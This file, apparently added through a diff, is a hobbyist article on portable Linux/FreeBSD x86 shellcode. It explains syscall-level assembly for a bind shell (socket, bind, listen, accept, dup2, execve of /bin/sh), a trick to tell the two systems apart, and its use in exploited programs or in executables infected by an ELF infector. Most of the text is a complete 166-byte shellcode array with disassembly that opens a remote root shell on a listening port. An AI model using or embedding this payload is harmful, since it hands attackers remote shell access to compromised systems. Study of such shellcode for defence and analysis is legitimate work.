@@ -1,0 +1,266 @@
+
+                          Linux+FreeBSD shellcode
+                          =======================
+
+  Hello, All!
+
+  This little article will just describe in some few words so called shellcode
+  for Linux and FreeBSD systems, i.e. shellcode that works on both, so you can
+  call it universal or portable, dunno what is more incorrect. And since i'm
+  novice in all this crap, i usually dont understand what i'm speaking about -
+  so be careful. ;) To be honest, to write this code i've used that nice stuff
+  from http://lsd-pl.net/ -- seems really cool dudes there. My contribution is
+  only that i've mixed two existing shellcodes, added fork() and some minor
+  things, so new shellcode appeared to be portable, and a bit greater in size
+  than each of old ones separately, but smaller than a sum of them.
+
+  The shellcode, in some abstract form, looks as following:
+
+          Target is SHELLCODE.        Target is CODE SNIPPET.
+          Exploited program:          Infected file (using INFELF):
+
+             EXECUTABLE                    EXECUTABLE  <------+
+                 |                              |             |
+                 |                       [original bytes,     |
+                 |                   stealed at hook offset]  |
+             [exploit                           |             |
+                is                            fork()          |
+               here]                          /   \           |
+                 |                         child  parent -----+
+                 |                            |
+                 +--------------+-------------+
+                                |
+                             socket()
+                                |
+                              bind()
+                                |
+                             listen() <-------+
+                                |             |
+                             accept()         |
+                                |             |
+                              fork()          |
+                             /    \           |
+                          child  parent ------+
+                            |
+                          dup2()
+                            |
+                     execve('/bin/sh')
+
+  As you can see, only few functions should be called, and for almost all
+  readers meaning of these functions is clear.
+
+  Here is how syscalls looks like:
+
+        Linux:                             FreeBSD:
+
+  exit()
+
+        mov     eax, 1                     --//--
+        int     80h
+
+  close(handle)
+
+        mov     eax, 6                     mov     eax, 6
+        mov     ebx, handle                push    handle
+                                           push    unused
+        int     80h                        int     80h
+                                           add     esp, 8
+        cmp     eax, -9                    cmp     eax, 9
+        je      badf                       je      badf
+
+  fork()
+        mov     eax, 2                     --//--
+        int     80h
+        cmp     eax, 0
+        je      clone
+
+  socket(family, type, proto)
+
+        push    proto                      push    proto       ; 0=IP
+        push    type                       push    type        ; 1=SOCK_STREAM
+        push    family                     push    family      ; 2=PF_INET
+        mov     ecx, esp
+        mov     ebx, 1                     push    unused
+        mov     eax, 102                   mov     eax, 97
+        int     80h                        int     80h
+        add     esp, 12                    add     esp, 16
+
+  bind(socket, addr, len)
+
+        push    len                        push    len         ; 16
+        push    addr                       push    addr
+        push    socket                     push    socket
+        mov     ecx, esp
+        mov     ebx, 2                     push    unused
+        mov     eax, 102                   mov     eax, 104
+        int     80h                        int     80h
+        add     esp, 12                    add     esp, 16
+
+  listen(socket, backlog)
+
+        push    backlog                    push    backlog     ; 1
+        push    socket                     push    socket
+        mov     ecx, esp
+        mov     ebx, 4                     push    unused
+        mov     eax, 102                   mov     eax, 106
+        int     80h                        int     80h
+        add     esp, 8                     add     esp, 12
+
+  accept(socket, addr, len)
+
+        push    len                        push    len         ; 16
+        push    addr                       push    addr
+        push    socket                     push    socket
+        mov     ecx, esp
+        mov     ebx, 5                     push    unused
+        mov     eax, 102                   mov     eax, 30
+        int     80h                        int     80h
+        add     esp, 12                    add     esp, 16
+
+  dup2(old_handle, new_handle)
+
+        mov     ecx, new_socket            push    new_socket  ; 0,1,2
+        mov     ebx, old_socket            push    old_socket
+                                           push    unused
+        mov     eax, 63                    mov     eax, 90
+        int     80h                        int     80h
+                                           add     esp, 12
+
+  execve(fname, argv[], envp[])
+
+        mov     edx, envp                  push    envp        ; 0
+        mov     ecx, argv                  push    argv        ; ['/bin/sh'] [0]
+        mov     ebx, fname                 push    fname       ; '/bin/sh'
+                                           push    unused
+        mov     eax, 11                    mov     eax, 59
+        int     80h                        int     80h
+                                           add     esp, 16
+
+  Now, about how we distinguish between Linux and FreeBSD -
+  in NASM it looks as following:
+
+        push    byte 6          ; EAX = 6 = close()
+        pop     eax
+        xor     ebx, ebx
+        dec     ebx             ; EBX = handle = -1
+        push    ebx             ; push handle = -1
+        push    esp             ; unused
+        int     80h
+        pop     ecx             ; fix stack
+        pop     ecx
+        or      eax, eax        ; EBADF: linux: EAX=-9 freebsd: EAX=9
+        popa
+        jl      short __linux   ; jl == jmp if linux
+   __freebsd:
+
+  And here is mix of all the stuff:
+
+--- begin shellcode.cpp ---
+
+#include <stdio.h>
+#include <string.h>
+
+#if defined(X86) && ( defined(LINUX) || defined(FREEBSD) )
+
+char shellcode[] =         /* 166 (0xA6) bytes                  */
+ "\xEB\x5D"                /* 00 jmp     short <shellcode+0x5F> */
+ "\x5D"                    /* 02 pop     ebp                    */
+ "\x31\xDB"                /* 03 xor     ebx, ebx               */
+ "\x53"                    /* 05 push    ebx                    */
+ "\x68\xFF\x02\x33\x33"    /* 06 push    333302FFh              */
+ "\x89\xE7"                /* 0B mov     edi, esp               */
+ "\x53"                    /* 0D push    ebx                    */
+ "\x43"                    /* 0E inc     ebx                    */
+ "\x53"                    /* 0F push    ebx                    */
+ "\x6A\x02"                /* 10 push    2                      */
+ "\xB0\x61"                /* 12 mov     al, 61h                */
+ "\xFF\xD5"                /* 14 call    ebp                    */
+ "\x89\xD6"                /* 16 mov     esi, edx               */
+ "\x6A\x10"                /* 18 push    10h                    */
+ "\x57"                    /* 1A push    edi                    */
+ "\x56"                    /* 1B push    esi                    */
+ "\x43"                    /* 1C inc     ebx                    */
+ "\xB0\x68"                /* 1D mov     al, 68h                */
+ "\xFF\xD5"                /* 1F call    ebp                    */
+ "\x6A\x04"                /* 21 push    4                      */
+ "\x5B"                    /* 23 pop     ebx                    */
+ "\x53"                    /* 24 push    ebx                    */
+ "\x56"                    /* 25 push    esi                    */
+ "\xB0\x6A"                /* 26 mov     al, 6Ah                */
+ "\xFF\xD5"                /* 28 call    ebp                    */
+ "\x31\xC9"                /* 2A xor     ecx, ecx               */
+ "\x51"                    /* 2C push    ecx                    */
+ "\x51"                    /* 2D push    ecx                    */
+ "\x56"                    /* 2E push    esi                    */
+ "\x43"                    /* 2F inc     ebx                    */
+ "\xB0\x1E"                /* 30 mov     al, 1Eh                */
+ "\xFF\xD5"                /* 32 call    ebp                    */
+ "\x89\xD3"                /* 34 mov     ebx, edx               */
+ "\xB0\x02"                /* 36 mov     al, 2                  */
+ "\xFF\xD5"                /* 38 call    ebp                    */
+ "\x75\xE5"                /* 3A jnz     short <shellcode+0x21> */
+ "\x31\xC9"                /* 3C xor     ecx, ecx               */
+ "\xB0\x3F"                /* 3E mov     al, 3Fh                */
+ "\xFF\xD5"                /* 40 call    ebp                    */
+ "\x41"                    /* 42 inc     ecx                    */
+ "\x80\xF9\x02"            /* 43 cmp     cl, 2                  */
+ "\x76\xF6"                /* 46 jbe     short <shellcode+0x3E> */
+ "\x31\xD2"                /* 48 xor     edx, edx               */
+ "\x52"                    /* 4A push    edx                    */
+ "\x68\x2F\x2F\x73\x68"    /* 4B push    68732F2Fh              */
+ "\x68\x2F\x62\x69\x6E"    /* 50 push    6E69622Fh              */
+ "\x89\xE3"                /* 55 mov     ebx, esp               */
+ "\x52"                    /* 57 push    edx                    */
+ "\x53"                    /* 58 push    ebx                    */
+ "\x89\xE1"                /* 59 mov     ecx, esp               */
+ "\xB0\x0B"                /* 5B mov     al, 0Bh                */
+ "\xFF\xD5"                /* 5D call    ebp                    */
+ "\xE8\x9E\xFF\xFF\xFF"    /* 5F call    <shellcode+0x02>       */
+ "\x60"                    /* 64 pusha                          */
+ "\x6A\x06"                /* 65 push    6                      */
+ "\x58"                    /* 67 pop     eax                    */
+ "\x31\xDB"                /* 68 xor     ebx, ebx               */
+ "\x4B"                    /* 6A dec     ebx                    */
+ "\x53"                    /* 6B push    ebx                    */
+ "\x54"                    /* 6C push    esp                    */
+ "\xCD\x80"                /* 6D int     80h                    */
+ "\x59"                    /* 6F pop     ecx                    */
+ "\x59"                    /* 70 pop     ecx                    */
+ "\x09\xC0"                /* 71 or      eax, eax               */
+ "\x61"                    /* 73 popa                           */
+ "\x7C\x11"                /* 74 jl      short <shellcode+0x87> */
+ "\x3C\x0B"                /* 76 cmp     al, 0Bh                */
+ "\x74\x21"                /* 78 jz      short <shellcode+0x9B> */
+ "\x3C\x3F"                /* 7A cmp     al, 3Fh                */
+ "\x74\x19"                /* 7C jz      short <shellcode+0x97> */
+ "\x0F\xB6\xC0"            /* 7E movzx   eax, al                */
+ "\xCD\x80"                /* 81 int     80h                    */
+ "\x92"                    /* 83 xchg    eax, edx               */
+ "\x09\xD2"                /* 84 or      edx, edx               */
+ "\xC3"                    /* 86 retn                           */
+ "\x3C\x1E"                /* 87 cmp     al, 1Eh                */
+ "\x74\x04"                /* 89 jz      short <shellcode+0x8F> */
+ "\x3C\x3F"                /* 8B cmp     al, 3Fh                */
+ "\x76\xEF"                /* 8D jbe     short <shellcode+0x7E> */
+ "\xB0\x66"                /* 8F mov     al, 66h                */
+ "\x8D\x4C\x24\x04"        /* 91 lea     ecx, [esp+4]           */
+ "\xEB\xE7"                /* 95 jmp     <shellcode+0x7E>       */
+ "\xB0\x5A"                /* 97 mov     al, 5Ah                */
+ "\xEB\x02"                /* 99 jmp     short <shellcode+0xA0> */
+ "\xB0\x3B"                /* 9B mov     al, 3Bh                */
+ "\x5E"                    /* 9D pop     esi                    */
+ "\x52"                    /* 9E push    edx                    */
+ "\x51"                    /* 9F push    ecx                    */
+ "\x53"                    /* A0 push    ebx                    */
+ "\x54"                    /* A1 push    esp                    */
+ "\xCD\x80"                /* A2 int     80h                    */
+ "\xFF\xE6"                /* A4 jmp     esi                    */
+;
+#endif
+
+char main()
+{
+  printf("shellcode size = %d bytes\n", strlen(shellcode));
+}
+
+--- end shellcode.cpp ---
